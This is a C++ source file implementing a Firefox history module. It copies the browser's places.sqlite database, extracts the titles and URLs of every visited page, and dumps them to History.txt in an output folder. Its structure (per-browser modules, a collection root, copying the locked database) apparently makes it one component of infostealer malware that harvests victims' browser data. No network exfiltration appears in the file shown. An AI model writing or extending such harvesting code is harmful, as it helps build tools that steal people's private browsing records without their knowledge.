//
// Created by .1qxz on 10.06.2024.
//

#include "FHistory.h"

void FHistory::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->withProfile(browser_root) / "places.sqlite";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> history;

    SQLiteUtil::connectAndRead(R"(
        SELECT moz_places.title, moz_places.url
        FROM moz_places
        JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
    )", copied_db, [&history](sqlite3_stmt *stmt) {
        auto history_record = std::make_unique<History>();
        history_record->title = SQLiteUtil::readString(stmt, 0);
        history_record->url = SQLiteUtil::readString(stmt, 1);

        history.push_back(std::move(history_record));
    });

    fs::remove(copied_db);

    Entity::writeSelf(root / "History.txt", history);
}
